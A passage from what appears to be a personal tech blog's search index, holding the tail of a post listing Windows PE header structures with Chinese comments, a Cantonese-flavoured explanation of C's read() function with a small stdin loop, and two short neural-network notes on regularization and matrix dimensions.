<span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"><span class="comment">//块表头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输入表结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                 </span><br><span class="line">    DWORD   ForwarderChain;            </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//INT、 IAT</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定输入表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    OffsetModuleName;</span><br><span class="line">    WORD    NumberOfModuleForwarderRefs;</span><br><span class="line"><span class="comment">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span></span><br><span class="line">&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_FORWARDER_REF</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    OffsetModuleName;</span><br><span class="line">    WORD    Reserved;</span><br><span class="line">&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重定位表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//资源目录结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;   <span class="comment">//理论上为资源的属性，不过事实上总是0</span></span><br><span class="line">    DWORD   TimeDateStamp; <span class="comment">//资源产生的时刻</span></span><br><span class="line">    WORD    MajorVersion; <span class="comment">//资源版本，不过事实上总是0</span></span><br><span class="line">    WORD    MinorVersion; <span class="comment">//</span></span><br><span class="line">    WORD    NumberOfNamedEntries; <span class="comment">//以名称(字符串)命名的入口数量</span></span><br><span class="line">    WORD    NumberOfIdEntries; <span class="comment">//以ID(整型数字)命名的入口数量</span></span><br><span class="line"><span class="comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;</span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">        DWORD   Name; <span class="comment">//目录项的名称字符串指针(0:ID)</span></span><br><span class="line">        WORD    Id;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData; <span class="comment">//目录项指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;</span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME2;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;</span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span></span><br><span class="line">    WORD    Length; <span class="comment">//字符串的长度</span></span><br><span class="line">    WCHAR   NameString[ <span class="number">1</span> ]; <span class="comment">//UNICODE字符串</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData; <span class="comment">//资源数据的RVA</span></span><br><span class="line">    DWORD   Size; <span class="comment">//资源数据的长度</span></span><br><span class="line">    DWORD   CodePage; <span class="comment">//代码页，一般为0</span></span><br><span class="line">    DWORD   Reserved; <span class="comment">//保留字段</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> clang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dive into the C raed function. 深入c语言嘅 read 函数</title>
      <link href="/2020/01/23/c_lang_read/"/>
      <url>/2020/01/23/c_lang_read/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>我们都知道c语言是一门非常强大的语言, 这得益于佢对系统底层嘅完美封装，因此用c语言读取文件嘅效率非常高, 接下来我们来看看读取文件最基本嘅函数 – read</p><h1 id="read函数的定义"><a href="#read函数的定义" class="headerlink" title="read函数的定义"></a>read函数的定义</h1><p>我们来看一下read嘅定义:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">void</span> *buf,<span class="type">size_t</span> nbyte)</span></span><br></pre></td></tr></table></figure><p>调用该函数就会从fd中读取最多nbytes个字节到缓冲区buf中</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先我们看到第一个参数fd系int类型嘅, 当你打开文件时可以调用open函数返回值赋给fd:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(文件地址)</span><br><span class="line">read(fd, ...)</span><br></pre></td></tr></table></figure><p>当然我们也可以不打开文件, 我们使用STDIN_FILENO 可以建一个待读写嘅文件:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(STDIN_FILENO, ...)</span><br></pre></td></tr></table></figure><p>实际上, <code>fd</code>指的就是文件描述符, 咁问题来了, 咩系”文件描述符”?</p><h1 id="文件描述符系咩"><a href="#文件描述符系咩" class="headerlink" title="文件描述符系咩?"></a>文件描述符系咩?</h1><p>我们可以把文件描述符理解成一个索引, 当调用read函数嘅时候, 系统内核会利用文件描述符（file descriptor）来访问文件. 而打开现存文件或新建文件时, 即系调用open函数后, 系统内核会返回一个文件描述符. </p><p>其实呢, 在操作系统内部对文件进行相关操作时，都可能会创建对应的文件描述符, 这不正正应证了那句名言<code>Linux 中一切都是文件</code>?</p><h1 id="模拟vim编辑器的输入模式"><a href="#模拟vim编辑器的输入模式" class="headerlink" title="模拟vim编辑器的输入模式"></a>模拟vim编辑器的输入模式</h1><p>接下来我们就能用c语言read写模拟vim嘅输入模式喇:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (read(STDIN_FILENO, &amp;c, <span class="number">1</span>) == <span class="number">1</span> &amp;&amp; c != <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就系个人对c语言文件读取的理解, 由于系个初学者(弱鸡)可能有D地方会有错误, 欢迎各位指出!!!</p>]]></content>
      
      
      
        <tags>
            
            <tag> clang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neural Network 0x02- Optimization. 神经网络笔记 -- 优化手段</title>
      <link href="/2019/07/04/deep_learning/note_neural_network2/"/>
      <url>/2019/07/04/deep_learning/note_neural_network2/</url>
      
        <content type="html"><![CDATA[<h1 id="正则化-Regularization"><a href="#正则化-Regularization" class="headerlink" title="正则化(Regularization)"></a>正则化(Regularization)</h1><p>深度学习可能存在过拟合问题，有两个解决方法，一个是正则化，另一个是准备更多的数据。</p><p>至于为什么起作用这篇笔记讲得 very good:<br><a href="http://www.ai-start.com/dl2017/html/lesson2-week1.html#header-n119">http://www.ai-start.com/dl2017/html/lesson2-week1.html#header-n119</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> ai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neural Network 0x01- Check the Shape. 神经网络笔记 -- 核对矩阵的维度</title>
      <link href="/2019/07/01/deep_learning/note_neural_network1/"/>
      <url>/2019/07/01/deep_learning/note_neural_network1/</url>
      
        <content type="html"><![CDATA[<h1 id="先落结论"><a href="#先落结论" class="headerlink" title="先落结论"></a>先落结论</h1><p>用 n[l] 表示第 l 层神经元的数量, w[l] 为第 l 层的权重, b[l] 为偏置<br>z[l] 表示未激活前的矩阵(也就是wx+b的结果), a[l] 表示激活 z[l] 后(第 l 层的输出)的矩阵<br>那么正确的神经网络各矩阵的维度应该为:<br>w[l]: (n[l], n[l - 1])<br>b[l]: (n[l], 1)<br>a[l], z[l]: (n[l], 1)<br>当输入多个训练集m, w[l] 维度不变(因为神经元数量 n[l] 和 n[l - 1] 没有改变), 而 z[l], a[l] 变为 (n[l], m).  </p><h1 id="推导过程"><a href="#推导过程" class="headerlink" title="推导过程"></a>推导过程</h1><p>简单地说就是要满足矩阵乘法的正确性.  </p><p>假设只有 1 个训练集, 我们知道第 l 层神经网络如下:<br>z[l] = w[l] a[l - 1] + b[l]<br>a[l] = g<a href="z%5Bl%5D">l</a></p><p>我们知道在第 l - 1 层有 n[l - 1] 个神经元, 那么上一层的输出 a[l - 1] 一定是 (n[l - 1], 1) 的, 假设 w[l] 有 k行j列, 那么:<br>(k, j) * (n[l - 1], 1) + (n[l], 1), 根据矩阵乘法我们显然可以知道 j 一定为 n[l - 1], 由于当前层有 n[l] 个神经元, 所以要分配一个 n[l] 行的矩阵给 w[l] (k = n[l]).<br>于是 w[l]: (n[l], n[l - 1])</p><p>激活函数是个向量化的函数, 显然可以得到 z[l] 和 a[l] 的维度是相等的.  </p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> ai </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
